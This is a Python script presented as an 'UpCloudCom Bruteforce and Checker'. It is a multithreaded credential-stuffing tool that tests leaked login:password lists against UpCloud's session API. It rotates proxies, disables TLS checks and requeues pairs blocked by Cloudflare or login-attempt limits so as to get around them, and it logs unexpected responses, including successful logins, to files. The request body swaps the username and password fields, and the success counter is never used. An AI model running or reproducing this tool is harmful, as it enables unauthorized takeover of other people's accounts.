import requests
import sys, os
import random
import datetime
import threading
import time
from helpers.colors import bcolors
from bs4 import BeautifulSoup as soup

from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)



class Brute(object):
    def __init__(self):
        self.projectName = "UpCloudCom"
        self.projectFullName = "UpCloudCom Bruteforce and Checker"
        self.description = "Author : Pirate2110"
        self.good = 0
        self.bad = 0 
        self.error = 0
        self.projerror = 0
        self.projid = 0
        self.proxylink = ""
        self.prlines = []
        self.proxytype = "https"
        self.basename = "log.txt"
        self.proxyname = "proxy.txt"
        self.captcha = 0
        self.running = True
        self.timeout = (15, 15)
        self.thread_count = 150
        self.today = datetime.datetime.today()
        self.lines = []
        self.lock = threading.Lock()
        self.count_list = 0

    def check(self, login, password):
        try:
            
            if self.proxytype == "no":
                proxies = None
            elif self.proxytype == "burp":
                proxies = {'https': '127.0.0.1:8080', 'http': '127.0.0.1:8080'}
            else:
                pr = self.getproxy()
                proxies = {'https': self.proxytype +  "://" + pr, 'http': self.proxytype +  "://" + pr}
            



            
            s = requests.session()
            
            
            body = '{"password":"'+login+'","username":"'+password+'"}'
            r = s.post("https://gate.upcloud.com/v1/session", data=body, proxies=proxies, verify=False, timeout=self.timeout)
            #print(r.text)

            if "Authentication credentials wrong" in r.text:
                self.bad += 1
            elif "Attention Required! | Cloudflare" in r.text or "Too many login attempts. Please try again in 1 hour" in r.text or "503 Service Temporarily Unavailable" in r.text:
                self.captcha += 1
                self.lines.append(login+':'+password)
            else:
                self.projerror += 1
                self.writelog("projerr.txt", login + ":" + password + "|" + str(r.text))
        except Exception as e:
            exc_type, exc_obj, exc_tb = sys.exc_info()
            fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
            #print(exc_type, fname, exc_tb.tb_lineno)
            self.error += 1
            self.lines.append(login+':'+password)
     
    def stop(self):
        self.running = False
        print("Work ended", end='\r')
        sys.stdout.flush()

   


    def mult(self):
        
        with open(self.basename, "r") as tags:
            for line in tags:
                #print(bcolors.WARNING + '[+] Start scanning : ' + line.strip() + bcolors.ENDC)
                self.lines.append(line.strip())
            print('Count of accounts : ' + str(len(self.lines)))  
        self.count_list = len(self.lines) 
        if "http" in self.proxylink:
            ptt = threading.Thread(target=self.updateProxyLink)
            ptt.daemon = True
            ptt.start()
            time.sleep(5)
        else:
            with open(self.proxyname, "r") as tags:
                for line in tags:
                    #print(bcolors.WARNING + '[+] Start scanning : ' + line.strip() + bcolors.ENDC)
                    self.prlines.append(line.strip())
                print('Count of proxies : ' + str(len(self.lines))) 
            
        self.startth()

    def startth(self):
        for i in range(self.thread_count):
            t = threading.Thread(target=self.work)
            t.daemon = True
            t.start()

    def updateProxyLink(self):
        while self.running:
            r = requests.get(self.proxylink, verify=False)
            
            self.prlines.clear()
            for line in r.text.split('\r\n'):
                self.prlines.append(line)
            time.sleep(60)
    def work(self):
    #print(bcolors.WARNING + '[+] Start scanning : ' + str(self.lines[0]) + bcolors.ENDC)
        while self.running:
            if (len(self.lines) == 0):
                self.stop()
                break

            
            if self.projid == 0:
                print( str(len(self.lines)) + "/" + str(self.count_list) + " (" + str(len(self.lines)  // (self.count_list/ 100)) + "%) " +bcolors.OKGREEN + str(self.good) + bcolors.ENDC   + "/" + bcolors.FAIL + str(self.bad) + bcolors.ENDC + "/"  + bcolors.WARNING+ str(self.error) + bcolors.ENDC + "/"  + bcolors.UNDERLINE+ str(self.projerror) + bcolors.ENDC + "/"  + bcolors.BOLD+ str(self.captcha) + bcolors.ENDC + " [" + str(threading.active_count()) + "]", end='\r')
                sys.stdout.flush()
            
            self.lock.acquire()
            trl = self.lines[0]
            self.lines.pop(0)
            self.lock.release()

            if ":" in trl:
                self.check(trl.split(':')[0], trl.split(':')[1])
            elif ";" in trl:
                self.check(trl.split(';')[0], trl.split(';')[1])
            else :
                pass
            time.sleep(0.1)
        self.exit_thread()

    def exit_thread(self):
        self.lock.acquire()
        self.thread_count -= 1
        self.lock.release()

    def getproxy(self):
        return str(random.choice(self.prlines))

    def writelog(self, file, log):
        dirr = "logs/" + self.projectName + "/" + str(self.today.strftime("%H.%M.%S")) + "/" +file
        os.makedirs(os.path.dirname(dirr), exist_ok=True)
        with open(dirr, 'a') as the_file:
            the_file.write(log + '\n')